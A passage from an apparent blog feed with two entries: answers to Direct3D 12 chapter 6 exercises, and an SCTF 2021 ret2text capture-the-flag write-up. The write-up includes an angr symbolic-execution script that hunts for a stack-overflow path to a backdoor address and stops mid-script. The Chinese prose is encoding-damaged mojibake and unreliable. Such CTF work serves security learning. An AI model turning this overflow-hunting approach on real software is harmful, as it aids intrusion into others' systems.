        <tag>å›¾å½¢å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>DX12 ç¬¬å…­ç« ä¹ é¢˜</title>
    <url>/2022/03/13/d3d12-6/</url>
    <content><![CDATA[<h1 id="DX12-6th"><a href="#DX12-6th" class="headerlink" title="DX12-6th"></a>DX12-6th</h1><h2 id="6th-Capture"><a href="#6th-Capture" class="headerlink" title="6th Capture"></a>6th Capture</h2><h3 id="6-13-7"><a href="#6-13-7" class="headerlink" title="6.13.7"></a>6.13.7</h3><p>Q: Merge the vertices of a box and pyramid (Exercise 4) into one large vertex buffer. Also merge the indices of the box and pyramid into one large index buffer (but do not update the index values). Then draw the box and pyramid one-by-one using the parameters of ID3D12CommandList::DrawIndexedInstanced. Use the world transformation matrix so that the box and pyramid are disjoint in world space</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305213358594.png" alt="image-20220305213358594"></p>
<p>åªè¦é…ç½®ä¸¤ä¸ª submesh ä»¥åŠåœ¨ drawIndexInstanced çš„æ—¶å€™æ³¨æ„ï¼Œé—æ†¾çš„æ˜¯æˆ‘åœ¨åˆ†å¼€ä¸¤ä¸ªçš„æ—¶å€™æˆ‘æ˜¯ç›´æ¥æŠŠä»–ä»¬åæ ‡è¯¥æ”¹ä¸€ä¸‹çš„ã€‚ä¸å¤§å¥½</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">virtual</span> <span class="token keyword">void</span> STDMETHODCALLTYPE <span class="token function">DrawIndexedInstanced</span><span class="token punctuation">(</span> 
    _In_  UINT IndexCountPerInstance<span class="token punctuation">,</span>
    _In_  UINT InstanceCount<span class="token punctuation">,</span>
    _In_  UINT StartIndexLocation<span class="token punctuation">,</span>
    _In_  INT BaseVertexLocation<span class="token punctuation">,</span>
    _In_  UINT StartInstanceLocation<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="6-13-8-6-13-9"><a href="#6-13-8-6-13-9" class="headerlink" title="6.13.8-6.13.9"></a>6.13.8-6.13.9</h3><p>Q: Modify the Box demo by rendering the cube in wireframe mode<br>Q: Modify the Box demo by disabling backface culling (D3D12_CULL_NONE); also try culling front faces instead of back faces (D3D12_CULL_FRONT). Output your results in wireframe mode so that you can more easily see the difference.</p>
<p>çº¿æ¡†ï¼ˆWIREFRAMEï¼‰åœ¨å…‰æ …åŒ–çš„æè¿°ä¸­é€‰æ‹©ã€‚</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">psoDesc<span class="token punctuation">.</span>RasterizerState <span class="token operator">=</span> <span class="token function">CD3DX12_RASTERIZER_DESC</span><span class="token punctuation">(</span>D3D12_DEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>
psoDesc<span class="token punctuation">.</span>RasterizerState<span class="token punctuation">.</span>FillMode <span class="token operator">=</span> D3D12_FILL_MODE_WIREFRAME<span class="token punctuation">;</span>
<span class="token comment">//psoDesc.RasterizerState.CullMode = D3D12_CULL_NONE;</span>
<span class="token comment">//psoDesc.RasterizerState.CullMode = D3D12_CULL_MODE_FRONT;</span>
<span class="token comment">/*
enum D3D12_CULL_MODE
    &#123;
        D3D12_CULL_MODE_NONE	= 1,
        D3D12_CULL_MODE_FRONT	= 2,
        D3D12_CULL_MODE_BACK	= 3
    &#125; 	D3D12_CULL_MODE;
*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>D3D12_CULL_MODE_FRONT<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305215313716.png" alt="image-20220305215313716"></p>
<p>D3D12_CULL_MODE_NONE<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305215505408.png" alt="image-20220305215505408"></p>
<h3 id="6-13-10"><a href="#6-13-10" class="headerlink" title="6.13.10"></a>6.13.10</h3><pre class="line-numbers language-none"><code class="language-none">Q:æ”¹å˜Colorçš„æ•°æ®ç±»å‹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ”¹ç”¨ XMCOLOR ä½œä¸ºé¢œè‰²ç±»å‹ , éœ€è¦ä¿®æ”¹å‡ å¤„æ•°æ®ã€‚<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305221053055.png" alt="image-20220305221053055">6.13.11</p>
<pre class="line-numbers language-none"><code class="language-none">vertex ç›¸å…³çš„æ•°æ®ç»“æ„ä¸­ï¼Œè°ƒæ¢é¡ºåºä¼šä¸ä¼šæœ‰ä»€ä¹ˆå½±å“<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ï¼ˆaï¼‰æ°å½“çš„ï¼Œåªè¦ D3D12_INPUT_ELEMENT_DESC ä¸­çš„ AlignedByteOffset ç”¨äºåˆ¤æ–­è¾“å…¥çš„ä½äºç»“æ„ä½“ä¸­çš„å“ªä¸ªåç§»<br>ï¼ˆbï¼‰æ°å½“çš„ã€‚è¿™ä¸ªåº”è¯¥æ˜¯ç”±äº desc ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æè¿°çš„æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å¯¹åº”é¡¹ã€‚</p>
<h3 id="6-13-12"><a href="#6-13-12" class="headerlink" title="6.13.12"></a>6.13.12</h3><p>æ­£å¸¸è§†å£<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305225030326.png" alt="image-20220305225030326"></p>
<p>å·¦åŠè¾¹è§†å£<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305225111429.png" alt="image-20220305225111429"></p>
<h3 id="6-13-13"><a href="#6-13-13" class="headerlink" title="6.13.13"></a>6.13.13</h3><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220307144654889.png" alt="image-20220307144654889"></p>
<h3 id="6-13-14"><a href="#6-13-14" class="headerlink" title="6.13.14"></a>6.13.14</h3><pre class="line-numbers language-hlsl" data-language="hlsl"><code class="language-hlsl"><span class="token keyword">float4</span> <span class="token function">PS</span><span class="token punctuation">(</span>VertexOut pin<span class="token punctuation">)</span> <span class="token operator">:</span> SV_Target
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">abs</span><span class="token punctuation">(</span>pin<span class="token punctuation">.</span>Color<span class="token operator">*</span><span class="token function">sin</span><span class="token punctuation">(</span>gTime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="6-13-15"><a href="#6-13-15" class="headerlink" title="6.13.15"></a>6.13.15</h3><p>clip ( pin.Color.r - 0.5f )<br>æŠŠé¢œè‰²å€¼å°äº 0.5f çš„è£æ‰äº†ã€‚</p>
<h3 id="6-13-16"><a href="#6-13-16" class="headerlink" title="6.13.16"></a>6.13.16</h3><p>è¿™é‡Œæœ‰å‘ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//å¯è¡Œ</span>
<span class="token keyword">struct</span> <span class="token class-name">ObjectConstants</span>
<span class="token punctuation">&#123;</span>
    XMFLOAT4X4 WorldViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    XMFLOAT4 gPulseColor<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gTime<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">//ä¸è¡Œï¼ŒgPulseColor å¯èƒ½æ˜¯å¯¹é½çš„é—®é¢˜</span>
<span class="token keyword">struct</span> <span class="token class-name">ObjectConstants</span>
<span class="token punctuation">&#123;</span>
    XMFLOAT4X4 WorldViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> gTime<span class="token punctuation">;</span>
    XMFLOAT4 gPulseColor<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="6-13-17"><a href="#6-13-17" class="headerlink" title="6.13.17"></a>6.13.17</h3><p>ç•¥ï¼Œä¹¦ä¸Šæºä»£ç æ¸…æ¸…æ¥šæ¥šçš„</p>
]]></content>
      <categories>
        <category>DX12</category>
      </categories>
      <tags>
        <tag>directX 12</tag>
        <tag>å›¾å½¢å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF 2021 ret2text</title>
    <url>/2021/12/27/sctf_2021_ret2text/</url>
    <content><![CDATA[<h1 id="CheckIn-ret2text"><a href="#CheckIn-ret2text" class="headerlink" title="CheckIn_ret2text"></a>CheckIn_ret2text</h1><h2 id="ç¬¦å·æ‰§è¡Œéƒ¨åˆ†"><a href="#ç¬¦å·æ‰§è¡Œéƒ¨åˆ†" class="headerlink" title="ç¬¦å·æ‰§è¡Œéƒ¨åˆ†"></a>ç¬¦å·æ‰§è¡Œéƒ¨åˆ†</h2><p>å—é™äºå¯¹ angr çš„ç†è§£ä»¥åŠä¸æ˜¯å¾ˆæ¸…æ¥šä¸€äº›é«˜çº§æ¥å£ï¼Œåªèƒ½æ‰‹ç³Šä¸€ä¸ª hook + state æºå¸¦è¾“å…¥å­—ç¬¦ä¸²ç¬¦å·æ‰§è¡Œè¿‡ç¨‹</p>
<p>å› ä¸ºä»£ç å†™çš„æ¯”è¾ƒæ‚å‡‘<br>ä¸ºç†è§£ä»¥ä¸‹ä»£ç éœ€è¦çŸ¥é“ state.memory ä¸­ 0x0 ç¬¬ä¸€ä¸ªå­—èŠ‚å­˜ç€å¤šå°‘æ¬¡è¾“å…¥ã€‚0x100åç§»ä¹‹åæ¯ä¸ª0x100å­˜å‚¨ä¸€ä¸ªç»“æ„ { type:1bytes ï¼Œsize:1bytes , str:size } åªèƒ½è¯´æ˜¯å¯¹ç—‡ä¸‹è¯äº†ã€‚ä¸ºäº†æ‰¾åˆ°æ ˆæº¢å‡ºï¼Œéœ€è¦å­˜å‚¨ä¸Šä¸€æ¬¡è¾“å…¥å­—ç¬¦ä¸²å¯ä»¥çš„é•¿åº¦ï¼Œæˆ‘ä¿å­˜åœ¨ input_str_off&#x3D; 0x100000 ã€‚æˆ‘çš„å‘½åå¤šå°‘æœ‰ç‚¹å¤æ€ªï¼Œæ˜æ˜æ˜¯ä¸ª size ï¼Œæˆ‘æŠŠå®ƒå‘½åæˆäº† str_off â€¦</p>
<p>è¦æ˜¯æœ‰ä»€ä¹ˆæ›´å¥½çš„å†™æ³•ï¼Œä¸€å®šè¦å‘Šè¯‰æˆ‘å‘€~</p>
<p><strong>2022&#x2F;3&#x2F;7 è¡¥å……</strong> hook çš„å†™æ³•å¯ä»¥å†™çš„ç®€æ´ä¸€äº›ã€‚è¿™é“é¢˜å¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œä¸éœ€è¦è‡ªå·±å»æ§åˆ¶ç¨‹åºæµæˆ–è€…åˆ†æã€‚æ‰¾åˆ°éçº¦æŸçš„çŠ¶æ€ç›´æ¥æ±‚è§£è¾“å…¥å³å¯ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> claripy
<span class="token keyword">import</span> angr
<span class="token keyword">from</span> angr <span class="token keyword">import</span> SimProcedure
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> archinfo
<span class="token keyword">import</span> copy

base <span class="token operator">=</span>  <span class="token number">0x400000</span>
start <span class="token operator">=</span> <span class="token number">0x4013ED</span>
out_off <span class="token operator">=</span> <span class="token number">0</span>
out_size <span class="token operator">=</span> <span class="token number">0</span>

symbol_num <span class="token operator">=</span> <span class="token number">0</span>
input_offset <span class="token operator">=</span> <span class="token number">0x100</span>
input_str_off<span class="token operator">=</span> <span class="token number">0x100000</span>
<span class="token keyword">class</span> <span class="token class-name">hook_input_val</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> symbol_num
        st <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        new_symbol  <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"input_%i"</span> <span class="token operator">%</span>symbol_num<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> new_symbol

        symbol_size <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span> <span class="token comment"># load size</span>
        before_size  <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>symbol_size<span class="token punctuation">)</span>
        after_size  <span class="token operator">=</span> before_size <span class="token operator">+</span> <span class="token number">1</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> after_size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>      <span class="token comment"># type</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>  <span class="token comment"># size</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> new_symbol<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span> <span class="token comment"># value</span>
        <span class="token comment"># st.memory.store(input_offset+0x100*before_size + 1, 0x20, size= 1, endness=archinfo.Endness.LE)</span>

        symbol_num <span class="token operator">+=</span> <span class="token number">1</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>st<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 0x401272</span>
<span class="token keyword">class</span> <span class="token class-name">hook_input_line</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> symbol_num
        st   <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        size <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esi<span class="token punctuation">)</span>
        pt   <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rdi

        symbol_size <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        before_size <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>symbol_size<span class="token punctuation">)</span>
        after_size  <span class="token operator">=</span> before_size <span class="token operator">+</span> <span class="token number">1</span>
        
        good_input  <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"input_%d"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>symbol_num<span class="token punctuation">,</span>symbol_num<span class="token operator">+</span>size<span class="token punctuation">)</span><span class="token punctuation">]</span>
        input_bytes <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>good_input<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> after_size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>

        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> input_bytes<span class="token punctuation">,</span> size<span class="token operator">=</span>size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>

        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pt<span class="token punctuation">,</span> input_bytes<span class="token punctuation">,</span> size<span class="token operator">=</span>size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_str_off<span class="token punctuation">,</span> size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>


        symbol_num <span class="token operator">+=</span> size
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>st<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 0x4012CE</span>
<span class="token keyword">class</span> <span class="token class-name">hook_strcmp</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment"># 0x4010C0</span>
<span class="token keyword">class</span> <span class="token class-name">hook_printf</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./binary"</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x401272</span><span class="token punctuation">,</span>hook_input_line<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x401216</span><span class="token punctuation">,</span>hook_input_val<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4010C0</span><span class="token punctuation">,</span>hook_printf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4012CE</span><span class="token punctuation">,</span>hook_strcmp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> start<span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0x8000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rbp <span class="token operator">=</span> <span class="token number">0x7000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rbx <span class="token operator">=</span> <span class="token number">0x0</span>
    
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sts <span class="token operator">=</span> <span class="token punctuation">[</span>st<span class="token punctuation">]</span>

    addr_of_strcpy     <span class="token operator">=</span> <span class="token number">0x4012CE</span>
    addr_of_input_line <span class="token operator">=</span> <span class="token number">0x401272</span>
    back_door          <span class="token operator">=</span> <span class="token number">0x401351</span>
    all_blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    may_has_overflow_block <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    may_has_overflow_block_addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    has_overflow <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>sts<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st <span class="token operator">=</span> sts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sts<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
        sucs <span class="token operator">=</span> st<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>successors

        <span class="token keyword">if</span> <span class="token punctuation">(</span>sucs<span class="token punctuation">)</span><span class="token punctuation">:</span>
            cap <span class="token operator">=</span> sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone
            <span class="token keyword">if</span><span class="token punctuation">(</span>cap<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'mov'</span> <span class="token keyword">and</span> cap<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>op_str <span class="token operator">==</span> <span class="token string">'eax, 0'</span> <span class="token keyword">and</span> cap<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'jmp'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                sucs<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span>sucs <span class="token keyword">and</span> sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>addr <span class="token operator">==</span> <span class="token number">0x4012ce</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            sucs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            st1 <span class="token operator">=</span> sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            st2 <span class="token operator">=</span> sucs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

            st1<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># ç›¸ç­‰</span>
            str_size <span class="token operator">=</span> st1<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>st1<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_str_off<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># å–å‡º size</span>
            st1_pt1 <span class="token operator">=</span> st1<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsi
            st1_pt2 <span class="token operator">=</span> st1<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rdi
